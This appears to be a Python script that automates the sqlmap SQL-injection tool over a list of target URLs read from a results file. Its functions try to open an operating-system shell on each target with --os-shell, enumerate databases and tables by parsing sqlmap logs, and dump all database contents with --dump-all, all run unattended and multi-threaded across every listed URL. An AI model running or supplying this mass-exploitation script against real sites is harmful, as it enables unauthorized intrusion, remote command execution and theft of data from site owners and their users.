import subprocess
from urllib.parse import urlparse
import re
tables_pattern = r"available databases\s*\[(\d+)\]"
def os_shell():
    with open("results/sql.txt", "r") as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--os-shell", "--output-dir=sql"])

def dbs():
    with open("results/sql.txt", "r") as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--dbs", "--output-dir=sql"])
        tables(url)

def tables(url):
    isTable = False
    parsed_url = urlparse(url).netloc
    print(f"sql/{parsed_url}/log")
    with open(f"sql/{parsed_url}/log", "r") as f:
        lines = f.readlines()
        for line in lines:
            match = re.search(tables_pattern,line)
            if(isTable==True):
                table = line.strip().replace("[*] ","")
                subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "-D",table,"--tables","--output-dir=sql"])
            if match:
                isTable = True

def dumpall():
    with open("results/sql.txt", "r") as f:
        urls = f.readlines()
    for url in urls:
        subprocess.run(["sqlmap", "-u", url, "-v3","--dump-all", "--batch", "--threads=10","--output-dir=sql"])